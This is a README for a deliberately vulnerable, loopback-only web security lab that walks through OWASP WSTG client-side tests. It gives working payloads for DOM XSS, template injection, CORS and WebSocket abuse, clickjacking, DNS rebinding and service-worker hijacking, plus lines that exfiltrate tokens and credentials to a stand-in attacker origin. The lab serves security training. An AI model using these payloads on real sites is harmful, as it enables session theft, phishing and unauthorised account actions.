# M09 - Client-side Testing

> **Intentionally vulnerable training target.** Every weakness here is deliberate.
> For authorised security testing and training only. All ports are published on
> `127.0.0.1`; do not expose this stack to any network you do not control.
> The lab never contacts the internet: the "attacker" is an in-range origin.

Covers **19 WSTG tests / 20 documents**: `WSTG-CLNT-01..07, 09..16, 18..21`
(including the sub-document `01.1 Self DOM Based XSS`). `WSTG-CLNT-08` and
`WSTG-CLNT-17` are removed upstream and are not claimed.

## Topology

```
   :8900 ──▶ app        victim web app (aiohttp, HTTP + WebSockets)
   :8901 ──▶ attacker   attacker/collaborator origin: attack pages + /collect recorder
             attacker :8902 (unpublished) rebinding stage-1 listener
   :8902 ──▶ internal   internal admin service, loopback-only, no auth, any Host
   :8908 ──▶ rebind     rebinding forward proxy + control API (/state /flip /reset)
   :8953 ──▶ rebind     authoritative DNS for rebind.lab.test, TTL 0
```

| Port | Service | Purpose |
|---|---|---|
| 8900 | app | victim app, primary HTTP |
| 8901 | attacker | attacker origin, callback recorder (`/collect`, `/records`) |
| 8902 | internal | internal-only rebinding target (`/internal/secret`) |
| 8908 | rebind | HTTP forward proxy used by Chromium for DNS rebinding |
| 8953 | rebind | DNS (UDP+TCP), `rebind.lab.test` A records with TTL 0 |

All services sit on one compose bridge network (`edge`). There is no datastore;
state is in-memory and resettable (`GET /reset` on app and attacker,
`GET /reset` on the rebind proxy).

## Run

```bash
docker compose up --build -d
docker compose ps

# isolated verify venv (Playwright drives a real Chromium).
# Use Python 3.12/3.13: Playwright 1.48's greenlet dependency has no 3.14 wheels.
python3.12 -m venv verify/.venv
verify/.venv/bin/pip install -r verify/requirements.txt
# machine-local browser dir avoids clashing with other machines' Playwright installs
PLAYWRIGHT_BROWSERS_PATH="$PWD/verify/.browsers" verify/.venv/bin/playwright install chromium
# (if the Azure CDN is unreachable, fetch the zip from
#  https://cdn.playwright.dev/dbazure/download/playwright/builds/chromium/1140/chromium-mac-arm64.zip
#  and unzip it into verify/.browsers/chromium-1140/, then touch INSTALLATION_COMPLETE inside)
verify/.venv/bin/python ../../tools/runner.py machines/09-client-side   # 19 probes, expect 19/19
```

If your Docker injects a host-side proxy from `~/.docker/config.json`, the
compose file already blanks it for builds (`LAB_HTTP_PROXY` overrides).

## Attack walkthrough

Synthetic credentials: `alice` / `Password123!` (also `bob`). Log in at `/login`.
The session cookie is deliberately `SameSite=None; Secure` without `HttpOnly`,
so it flows on cross-origin requests and is readable by any injected script.
`127.0.0.1` is a secure context for Chromium, which is why service workers and
`Secure` cookies work over plain HTTP here.

### WSTG-CLNT-01 - DOM-Based XSS (+ 01.1 Self DOM XSS)
- `http://127.0.0.1:8900/dom-xss#<img src=x onerror=alert(1)>` - `location.hash`
  flows into `innerHTML`.
- `/dom-xss?name=<script>alert(1)</script>` - `location.search` flows into
  `document.write`.
- **Self-DOM-XSS**: on `/self-xss` type `<img src=x onerror=alert(1)>` into the
  signature field and press Preview. Nothing is sent to the server; it executes
  only in your own browser. `/self-xss?csp=1` sends a nonce-based CSP
  (`script-src 'self' 'nonce-labselfnonce'`) which blocks the injected event
  handler while the page's own nonced script still runs.

### WSTG-CLNT-02 - JavaScript Execution
- `/js-exec?expr=alert(document.domain)` - `eval()` of a URL parameter.
- Type `alert(1)` into the `new Function` / `setTimeout(string)` fields and run.
- JSONP callback injection: `/js-exec?cb=alert(1);//` loads
  `/api/jsonp?callback=alert(1);//`, whose body becomes `alert(1);//({...});`
  and executes in the victim origin.

### WSTG-CLNT-03 - HTML Injection
`/html-inject?markup=<h1>ACCOUNT SUSPENDED</h1><form action="http://127.0.0.1:8901/collect"><input name=username><input name=password><button>Sign in</button></form>`
The page CSP is `script-src 'none'`, so injected scripts die - but the spoofed
heading and the credential form render, and the form submits to the attacker
origin (check `http://127.0.0.1:8901/records?token=...`).

### WSTG-CLNT-04 - Client-side URL Redirect
`/redirect?next=http://127.0.0.1:8901/phish` - `location.href` is assigned the
raw parameter: no allowlist, no scheme check. `next=javascript:alert(1)` is also
accepted by the sink (execution depends on the browser's javascript-URL policy).

### WSTG-CLNT-05 - CSS Injection
`/profile?css=%23token[value^="t"]{background-image:url(http://127.0.0.1:8901/collect?css=t)}`
The page holds `<input id=token value=tok_9f2e77>`. Attribute-prefix selectors
plus `url()` callbacks leak the secret one character at a time to the attacker
listener; iterate prefixes (`t`, `to`, `tok`, ...) to recover it. CSS can also
redress the UI (move/overlay elements).

### WSTG-CLNT-06 - Client-side Resource Manipulation
`/widget?src=http://127.0.0.1:8901/evil.js` - the page creates a `<script>` with
the URL-supplied src. The attacker script runs in the victim origin and reads
`document.cookie`. `?frame=` does the same for an iframe.

### WSTG-CLNT-07 - CORS
Log in, then open `http://127.0.0.1:8901/cors-attack?token=demo`. From the
attacker origin it credentialed-reads:
- `/api/cors/reflect` - reflects any `Origin` with `Allow-Credentials: true`;
- `/api/cors/regex` - prefix regex `^http://127\.0\.0\.1` (no port/`$` anchor);
- `/api/cors/null` - allows `Origin: null` (sandboxed iframe) with credentials;
- `/api/cors/wildcard` - `ACAO: *` on an unauthenticated PII endpoint (readable
  by any origin without credentials).
`/api/cors/regex2` additionally accepts `http://trusted.lab.test.evil.com`
(unanchored subdomain regex). Results land in `/records?token=demo`.

### WSTG-CLNT-09 - Clickjacking
`/account/settings` (transfer form) sends no `X-Frame-Options` / `frame-ancestors`.
Open `http://127.0.0.1:8901/clickjack` while logged in: a transparent iframe of
the victim page sits over the "CLAIM REWARD" decoy. Clicking the decoy fires the
authenticated transfer (verify at `/account/state`).

### WSTG-CLNT-10 - WebSockets (CSWSH)
From any page on the attacker origin:
`new WebSocket('ws://127.0.0.1:8900/ws')` - the handshake does no Origin check
and authenticates by cookie alone. Send
`{"action":"transfer","to":"mallory","amount":"500"}` and the transfer happens;
`{"action":"echo","msg":"<img src=x onerror=alert(1)>"}` is echoed unsanitised.

### WSTG-CLNT-11 - Web Messaging
Frame `http://127.0.0.1:8900/messages` from the attacker origin and
`postMessage({action:'get-profile'}, '*')`: the receiver never checks
`event.origin` and answers with `targetOrigin:'*'`, leaking SSN/CSRF token.
`postMessage({action:'set-email', email:'evil@attacker.test'}, '*')` performs an
authenticated email change.

### WSTG-CLNT-12 - Browser Storage
Log in and open `/storage`: the session token and PII go to `localStorage` /
`sessionStorage`, card data to IndexedDB (`wallet/cards`). The page also has a
DOM-XSS sink: `/storage?note=<img src=x onerror="new Image().src='http://127.0.0.1:8901/collect?stolen='+localStorage.getItem('auth_token')">`
exfiltrates the token. Open `/storage` in two tabs and write
`localStorage.setItem('auth_token','x')` in one: the other tab's `storage`
handler renders the value (cross-tab propagation of secrets).

### WSTG-CLNT-13 - Cross Site Script Inclusion
Open `http://127.0.0.1:8901/xssi?token=demo` while logged in. Classic
`<script src>` inclusion (no CORS needed) reads:
- `/api/private.js` - `var PRIVATE_DATA = {ssn, salary, ...}`;
- `/api/jsonp?callback=jp` - JSONP with sensitive data;
- `/api/orders` - top-level JSON array (historical JSON-hijacking shape).
Note: the Array-constructor override no longer fires in modern browsers (array
literals use the intrinsic Array); the JS-variable and JSONP vectors are the
live ones, and the probe reports the hijack attempt honestly.

### WSTG-CLNT-14 - Reverse Tabnabbing
`/links` has `target="_blank" rel="opener"` (explicitly defeating the browser's
implicit noopener) and a `window.open()` button, with no COOP header. The opened
attacker page (`/tabnab`) sets `window.opener.location` to `/phish` - watch the
original tab turn into the phishing page.

### WSTG-CLNT-15 - Client-side Template Injection
`/template?expr={{constructor.constructor('alert(document.domain')()}}` -
AngularJS 1.8.2 (sandbox removed in 1.8) compiles the reflected expression.
URL-encode the payload. Any JS runs in the victim origin.

### WSTG-CLNT-16 - DOM Clobbering
`/clobber?bio=<a id="config" href="http://127.0.0.1:8901/evil.js">blog</a>` -
the naive sanitiser strips scripts/handlers but keeps `id`/`href`. The page
reads `window.config.href` to pick a script src; the named anchor clobbers the
undefined global and attacker JS loads in the victim origin.

### WSTG-CLNT-18 - Cross-Site Leaks
From the attacker origin (logged in vs not):
- **Frame count**: frame `/dashboard` and read `iframe.contentWindow.length` -
  3 widgets when authenticated, 0 when not.
- **Search oracle**: load `<script src="http://127.0.0.1:8900/api/search?q=7">` -
  `onload` (200) vs `onerror` (404) reveals whether the private note
  ("launch code 7391") contains the digit. Sweep 0-9 to recover the code.

### WSTG-CLNT-19 - Client-side Path Traversal
`/files?doc=../../api/admin/users` - the viewer does
`fetch('/api/files/' + doc)`; the browser normalises the `../` segments into
`/api/admin/users`, an unintended endpoint returning every user's PII.

### WSTG-CLNT-20 - Service Workers
1. Upload attacker JS to the unauthenticated same-origin script endpoint:
   `curl -X POST --data-binary @evil-sw.js http://127.0.0.1:8900/custom/evil.js`
   (served as `application/javascript` with `Service-Worker-Allowed: /`).
2. Open `/sw-page?sw=/custom/evil.js` - the page registers the URL-chosen
   script with root scope.
3. The worker intercepts `fetch('/api/data')` and rewrites the response
   (`balance: 0, owner: attacker-rewritten`). It survives navigation until
   unregistered - check `navigator.serviceWorker.getRegistrations()`.

### WSTG-CLNT-21 - DNS Rebinding
The lab DNS (`127.0.0.1:8953`) is authoritative for `rebind.lab.test` with
**TTL 0**. Phase "attacker" answers the attacker container's network IP; phase
"victim" answers the internal container's IP. Both run the same port (8902), so
the origin string never changes.

Chromium cannot be aimed at a custom stub resolver directly, so it is pointed
at the in-range forward proxy (`--proxy-server=http://127.0.0.1:8908`), which
performs a fresh TTL-0 lookup per request - the standard proxy-based rebinding
setup. Walkthrough:

```bash
curl http://127.0.0.1:8908/reset                      # phase: attacker
# browser (via proxy) loads http://rebind.lab.test:8902/  -> attacker page
curl http://127.0.0.1:8908/flip                       # phase: victim
# the page's same-origin fetch('/internal/secret') now hits the INTERNAL
# service and reads its secret - SOP bypass, visible in the page and /collect
curl http://127.0.0.1:8908/state                      # DNS + proxy evidence log
```

The internal service accepts the foreign `Host: rebind.lab.test:8902` without
authentication - the second half of the WSTG-CLNT-21 objective.

## Probe notes

- Probes drive real Chromium (Playwright) and assert executed effects: DOM
  flags, fired callbacks, values received by the attacker `/collect` recorder,
  navigations, and server-side state changes. Static inspection is only used as
  supporting evidence (e.g. absent security headers).
- Every probe creates its own state (unique callback tokens, unique SW script
  names) and cleans up where practical; reruns are idempotent.
- Playwright is imported lazily inside the helpers; without it the suite
  reports errors for browser probes rather than failing at import.